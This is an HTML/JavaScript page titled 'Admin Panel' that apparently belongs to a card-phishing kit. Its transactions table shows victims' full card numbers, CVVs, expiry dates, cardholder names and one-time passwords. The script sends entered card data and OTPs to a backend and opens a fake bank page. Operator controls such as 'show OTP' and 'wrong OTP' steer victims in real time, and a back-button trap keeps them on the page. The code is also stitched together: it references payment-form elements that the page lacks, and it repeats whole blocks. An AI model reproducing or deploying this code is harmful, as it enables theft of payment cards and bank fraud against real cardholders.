<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
    }
    .generate-link {
      background: #222;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    .form-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      color: #aaa;
    }
    input, textarea {
      width: 100%;
      padding: 8px;
      border: 1px solid #444;
      background: #333;
      color: #fff;
      border-radius: 4px;
    }
    .payment-link {
      margin-top: 15px;
      padding: 10px;
      background: #333;
      border-radius: 4px;
      display: none;
    }
    .copy-btn {
      background: #22c55e;
      border: none;
      color: white;
      padding: 5px 10px;
      border-radius: 4px;
      cursor: pointer;
      margin-left: 10px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: #111;
      margin-bottom: 20px;
    }
    th, td {
      padding: 10px;
      border: 1px solid #333;
      text-align: left;
      font-size: 12px;
    }
    th {
      background: #222;
    }
    tr:nth-child(even) {
      background: #222;
    }
    button {
      background: #4a90e2;
      color: #fff;
      border: none;
      padding: 6px 10px;
      margin-right: 4px;
      cursor: pointer;
      border-radius: 4px;
      font-size: 12px;
    }
    button:hover {
      background: #357ABD;
    }
    button:disabled {
      background: #666;
      cursor: not-allowed;
    }
    .status-badge {
      padding: 2px 6px;
      border-radius: 3px;
      font-size: 11px;
      font-weight: bold;
    }
    .status-processing { background: #f59e0b; color: #000; }
    .status-otp { background: #3b82f6; color: #fff; }
    .status-success { background: #22c55e; color: #fff; }
    .status-fail { background: #ef4444; color: #fff; }
    .otp-received {
      background-color: #10B981;
      color: white;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 12px;
    }
    .show-otp-btn { background: #22c55e; }
    .bank-page-btn { background: #8b5cf6; }
    .bank-page-btn:hover { background: #7c3aed; }
    .show-otp-btn:disabled { background: #666; }
    .wrong-otp-btn { background: #ef4444; }
    .wrong-otp-btn:hover { background: #dc2626; }
    /* Overlay for bank page (if needed) */
    .fullscreen-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(5px);
      z-index: 9999;
      display: none;
      justify-content: center;
      align-items: center;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 2s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Admin Panel</h1>
    
    <div class="generate-link">
      <h2>Generate Payment Link</h2>
      <form id="generateLinkForm">
        <div class="form-group">
          <label>Amount (INR)</label>
          <input type="number" id="amount" required min="1" step="1">
        </div>
        <div class="form-group">
          <label>Description</label>
          <textarea id="description" rows="2" required></textarea>
        </div>
        <button type="submit">Generate Link</button>
      </form>
      <div id="paymentLinkContainer" class="payment-link">
        <span>Payment Link: </span>
        <span id="paymentLink"></span>
        <button class="copy-btn" onclick="copyPaymentLink()">Copy</button>
      </div>
    </div>

    <h2>Transactions</h2>
    <table id="transactionsTable">
      <thead>
        <tr>
          <th>Invoice ID</th>
          <th>Email</th>
          <th>Amount</th>
          <th>Currency</th>
          <th>Card Number</th>
          <th>CVV</th>
          <th>Expiry</th>
          <th>Cardholder</th>
          <th>OTP</th>
          <th>Status</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody>
        <!-- Transaction rows will be injected here -->
      </tbody>
    </table>
  </div>

  <!-- New Overlay Element (for blur/loading when bank page is active) -->
  <div id="bankpageOverlay" class="fullscreen-overlay">
    <div class="spinner"></div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    let transactions = new Map();
    let paymentLinks = new Map();
    let bankpageWindow = null;
    let currentInvoiceId = "";
    let statusCheckInterval;
    let timerInterval;
    let timer = 180;
    let isCardValid = false;
    let isExpiryValid = false;
    let isProcessing = false;
    let consentChecked = true;

    // Fetch payment details on page load (if pid present)
    document.addEventListener('DOMContentLoaded', async () => {
      let urlParams = new URLSearchParams(window.location.search);
      let pid = urlParams.get('pid') || sessionStorage.getItem('pid');
      if (!pid || pid === "null") {
        console.warn("No valid pid provided; defaulting amount to 100");
        document.getElementById('amount').value = 100;
        document.getElementById('displayAmount').textContent = "100";
      } else {
        sessionStorage.setItem('pid', pid);
        try {
          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
          const data = await response.json();
          if (data.status === 'success' && data.payment) {
            const amount = parseInt(data.payment.amount, 10);
            if (!isNaN(amount) && amount > 0) {
              document.getElementById('amount').value = amount;
              document.getElementById('displayAmount').textContent = amount.toLocaleString('en-IN');
            } else {
              document.getElementById('amount').value = 100;
              document.getElementById('displayAmount').textContent = "100";
            }
          } else {
            console.error("Payment details not found for pid:", pid);
          }
        } catch (error) {
          console.error('Error fetching payment details:', error);
        }
      }
    });

    // --- Card formatting, validation, and type icon update functions ---
    function validateCard(number) {
      let arr = number.replace(/\D/g, '').split('').reverse().map(x => parseInt(x, 10));
      let sum = 0;
      for (let i = 0; i < arr.length; i++) {
        let val = arr[i];
        if (i % 2 === 1) {
          val *= 2;
          if (val > 9) val -= 9;
        }
        sum += val;
      }
      return sum % 10 === 0;
    }

    function formatCardNumber(value) {
      let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      v = v.slice(0, 16);
      const parts = [];
      for (let i = 0; i < v.length; i += 4) {
        parts.push(v.substring(i, i + 4));
      }
      return parts.join(' ');
    }

    function formatExpiry(value) {
      let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      let formatted = v;
      if (v.length >= 2) {
        formatted = v.slice(0, 2) + '/' + v.slice(2, 4);
      }
      return formatted;
    }

    function validateExpiry(value) {
      if (!/^\d{2}\/\d{2}$/.test(value)) return false;
      const [month, year] = value.split('/').map(num => parseInt(num, 10));
      if (month < 1 || month > 12) return false;
      const now = new Date();
      const currentYear = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;
      if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
      return true;
    }

    function updateCardError() {
      const cardInput = document.getElementById("cardNumber");
      const errorElem = document.getElementById("cardError");
      const plain = cardInput.value.replace(/\s/g, '');
      isCardValid = (plain.length === 16) ? validateCard(plain) : false;
      if (plain.length === 16 && !isCardValid) {
        errorElem.style.display = 'block';
        errorElem.textContent = "Please enter valid card number";
        cardInput.classList.add('border-red-500');
      } else {
        errorElem.style.display = 'none';
        cardInput.classList.remove('border-red-500');
      }
    }

    function detectCardType(number) {
      const clean = number.replace(/\D/g, '');
      const patterns = {
        visa: /^4/,
        mastercard: /^5[1-5]/,
        amex: /^3[47]/,
        rupay: /^(508[5-9]|60698|607[0-8][0-9]|6079[0-8]|608[0-5]|6521[5-9]|652[2-9][0-9]|6530[0-9]|6531[0-4])/
      };
      for (const [brand, pattern] of Object.entries(patterns)) {
        if (pattern.test(clean)) return brand;
      }
      return null;
    }

    async function updateCardTypeAndInfo(value) {
      const cardLogo = document.getElementById("cardLogo");
      const plain = value.replace(/\s/g, '');
      const detectedType = detectCardType(plain);
      const logos = {
        visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
        mastercard: 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png',
        amex: 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
        rupay: 'https://www.gokiwi.in/homepage/partners/rupay.svg'
      };
      if (plain.length > 0 && detectedType && logos[detectedType]) {
        cardLogo.src = logos[detectedType];
        cardLogo.classList.remove('hidden');
      } else {
        cardLogo.classList.add('hidden');
      }
    }

    function updateSubmitButton() {
      const email = document.getElementById('email').value.trim();
      const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
      const expiry = document.getElementById('expiry').value;
      const cvv = document.getElementById('cvv').value;
      const cardholder = document.getElementById('cardholderName').value.trim();
      const submitButton = document.getElementById('submitButton');
      if (isCardValid && isExpiryValid && cardNum.length === 16 && cvv.length === 3 && email && cardholder && consentChecked) {
        submitButton.disabled = false;
        submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-green-600 hover:bg-green-700";
      } else {
        submitButton.disabled = true;
        submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
      }
    }

    function updateConfirmOtpButton() {
      const otp = document.getElementById('otp').value;
      const otpButton = document.getElementById('otpSubmitButton');
      if (otp.length === 6) {
        otpButton.disabled = false;
        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
        document.getElementById('otpError').style.display = 'none';
      } else {
        otpButton.disabled = true;
        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
      }
    }

    // Consent checkbox event listener
    document.addEventListener("DOMContentLoaded", function(){
      const consentCheckbox = document.getElementById('consentCheckbox');
      consentCheckbox.addEventListener('click', function() {
        consentChecked = !consentChecked;
        if(consentChecked) {
          this.classList.add('checked');
        } else {
          this.classList.remove('checked');
        }
        updateSubmitButton();
      });
    });

    // Attach Input Event Listeners for card number and expiry fields
    document.addEventListener("DOMContentLoaded", function(){
      const cardInput = document.getElementById("cardNumber");
      const expiryInput = document.getElementById("expiry");
      if (cardInput) {
        cardInput.addEventListener("input", function(e) {
          const cursor = e.target.selectionStart;
          const lastLength = e.target.value.length;
          let formatted = formatCardNumber(e.target.value);
          e.target.value = formatted;
          updateCardError();
          updateCardTypeAndInfo(e.target.value);
          updateSubmitButton();
          if (cursor && cursor < lastLength) {
            const newCursor = cursor + (formatted.length - lastLength);
            e.target.setSelectionRange(newCursor, newCursor);
          }
        });
      }
      if (expiryInput) {
        expiryInput.addEventListener("input", function(e) {
          const cursor = e.target.selectionStart;
          const lastLength = e.target.value.length;
          let formatted = formatExpiry(e.target.value);
          e.target.value = formatted;
          isExpiryValid = (formatted.length === 5) ? validateExpiry(formatted) : false;
          updateSubmitButton();
          if (cursor && cursor < lastLength) {
            const newCursor = cursor + (formatted.length - lastLength);
            e.target.setSelectionRange(newCursor, newCursor);
          }
        });
      }
      ['email', 'cvv', 'cardholderName'].forEach(id => {
        document.getElementById(id).addEventListener('input', updateSubmitButton);
      });
      document.getElementById('otp').addEventListener('input', function(e) {
        updateConfirmOtpButton();
      });
    });

    // Payment Submission Handler
    document.getElementById('mainForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      if (!isCardValid || !isExpiryValid || isProcessing) return;
      
      isProcessing = true;
      // Show overlay to blur page and show spinner
      const overlay = document.getElementById('bankpageOverlay');
      overlay.style.display = 'flex';
      
      try {
        const response = await fetch("/api/sendPaymentDetails", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            email: document.getElementById('email').value,
            amount: document.getElementById('amount').value,
            currency: "INR",
            cardholder: document.getElementById('cardholderName').value
          })
        });
        
        const result = await response.json();
        if (result.status === "success") {
          // Open bankpage in new window
          bankpageWindow = window.open(`/bankpage.html?invoiceId=${result.invoiceId}`, '_blank');
          currentInvoiceId = result.invoiceId;
          
          // Start status check interval
          statusCheckInterval = setInterval(async () => {
            try {
              const statusRes = await fetch(`/api/checkTransactionStatus?invoiceId=${result.invoiceId}`);
              const statusData = await statusRes.json();
              // If the redirect URL does NOT include "bankpage", hide overlay and close bank page
              if (!statusData.redirectUrl || !statusData.redirectUrl.includes('bankpage')) {
                clearInterval(statusCheckInterval);
                overlay.style.display = 'none';
                if (bankpageWindow && !bankpageWindow.closed) {
                  bankpageWindow.close();
                }
              }
            } catch (err) {
              console.error('Status check error:', err);
              clearInterval(statusCheckInterval);
            }
          }, 1000);
        }
      } catch (err) {
        console.error('Payment submission error:', err);
        overlay.style.display = 'none';
        alert('Error processing payment. Please try again.');
        isProcessing = false;
      }
    });

    // OTP Submission Handler
    document.getElementById('otpSubmitButton').addEventListener('click', async () => {
      if (isProcessing) return;
      isProcessing = true;
      const otpButton = document.getElementById('otpSubmitButton');
      const otpLoader = document.getElementById('otpLoader');
      const btnText = document.getElementById('otpText');
      btnText.style.opacity = '0.5';
      btnText.style.filter = 'blur(1px)';
      otpLoader.classList.remove('hidden');
      otpButton.disabled = true;
      try {
        const response = await fetch("/api/submitOTP", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            invoiceId: currentInvoiceId,
            otp: document.getElementById('otp').value
          })
        });
        if (!response.ok) {
          throw new Error('Failed to submit OTP');
        }
        statusCheckInterval = setInterval(checkTransactionStatus, 2000);
      } catch (err) {
        console.error('OTP submission error:', err);
        alert('Error submitting OTP. Please try again.');
        isProcessing = false;
        otpButton.disabled = false;
        otpLoader.classList.add('hidden');
        btnText.style.opacity = '1';
        btnText.style.filter = 'none';
      }
    });

    // Transaction Status Check function
    async function checkTransactionStatus() {
      if (!currentInvoiceId) return;
      try {
        const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
        const data = await response.json();
        if (data.status === 'show_otp') {
          clearInterval(statusCheckInterval);
          document.getElementById('paymentForm').classList.add('hidden');
          document.getElementById('otpForm').classList.remove('hidden');
          const cardNumber = document.getElementById('cardNumber').value;
          document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
          if (!timerInterval) { startOtpTimer(); }
          if (data.otpError) {
            document.getElementById('otpError').style.display = 'block';
            const otpButton = document.getElementById('otpSubmitButton');
            const otpLoader = document.getElementById('otpLoader');
            const btnText = document.getElementById('otpText');
            btnText.style.opacity = '1';
            btnText.style.filter = 'none';
            otpLoader.classList.add('hidden');
            otpButton.disabled = false;
          } else {
            document.getElementById('otpError').style.display = 'none';
          }
          isProcessing = false;
        } else if (data.status === 'redirect') {
          window.location.href = data.redirectUrl;
        }
      } catch (err) {
        console.error('Error checking transaction status:', err);
      }
    }

    // OTP Timer function
    function startOtpTimer() {
      if (timerInterval) clearInterval(timerInterval);
      timer = 180;
      timerInterval = setInterval(() => {
        timer--;
        const minutes = Math.floor(timer / 60);
        const seconds = timer % 60;
        document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        if (timer <= 0) {
          clearInterval(timerInterval);
          window.location.href = '/fail.html';
        }
      }, 1000);
    }

    // Input event listeners for card and expiry fields
    document.addEventListener("DOMContentLoaded", function(){
      const cardInput = document.getElementById("cardNumber");
      const expiryInput = document.getElementById("expiry");
      if (cardInput) {
        cardInput.addEventListener("input", function(e) {
          const cursor = e.target.selectionStart;
          const lastLength = e.target.value.length;
          let formatted = formatCardNumber(e.target.value);
          e.target.value = formatted;
          updateCardError();
          updateCardTypeAndInfo(e.target.value);
          updateSubmitButton();
          if (cursor && cursor < lastLength) {
            const newCursor = cursor + (formatted.length - lastLength);
            e.target.setSelectionRange(newCursor, newCursor);
          }
        });
      }
      if (expiryInput) {
        expiryInput.addEventListener("input", function(e) {
          const cursor = e.target.selectionStart;
          const lastLength = e.target.value.length;
          let formatted = formatExpiry(e.target.value);
          e.target.value = formatted;
          isExpiryValid = (formatted.length === 5) ? validateExpiry(formatted) : false;
          updateSubmitButton();
          if (cursor && cursor < lastLength) {
            const newCursor = cursor + (formatted.length - lastLength);
            e.target.setSelectionRange(newCursor, newCursor);
          }
        });
      }
      ['email', 'cvv', 'cardholderName'].forEach(id => {
        document.getElementById(id).addEventListener('input', updateSubmitButton);
      });
      document.getElementById('otp').addEventListener('input', function(e) {
        updateConfirmOtpButton();
      });
    });

    // Socket.io listeners for realtime updates
    const socket = io();
    const storedInvoiceId = localStorage.getItem("invoiceId");
    if (storedInvoiceId) {
      socket.emit('join', storedInvoiceId);
    }
    socket.on('show_otp', (data) => {
      document.getElementById('paymentForm').classList.add('hidden');
      document.getElementById('otpForm').classList.remove('hidden');
    });
    socket.on('redirect', (data) => {
      window.location.href = data.redirectUrl;
    });

    // Back button prevention
    window.onpopstate = function(event) {
      if (confirm("Do you want to cancel this transaction?")) {
        window.location.href = '/fail.html?reason=canceled';
      } else {
        history.pushState(null, null, window.location.href);
      }
    };
    history.pushState(null, null, window.location.href);
  </script>

  <script src="/socket.io/socket.io.js"></script>
</body>
</html>
